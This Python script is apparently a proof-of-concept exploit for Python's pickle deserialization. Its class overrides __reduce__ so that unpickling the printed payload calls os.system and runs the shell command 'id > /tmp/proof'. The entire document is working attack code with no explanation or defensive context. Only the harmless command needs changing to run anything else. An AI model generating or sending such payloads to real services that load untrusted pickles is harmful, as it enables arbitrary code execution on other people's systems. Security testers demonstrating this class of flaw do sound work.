import pickle
import os

class Pickle(object):
    def __reduce__(self):
        return os.system, ('id > /tmp/proof',)

o = Pickle()
p = pickle.dumps(o)
print(p)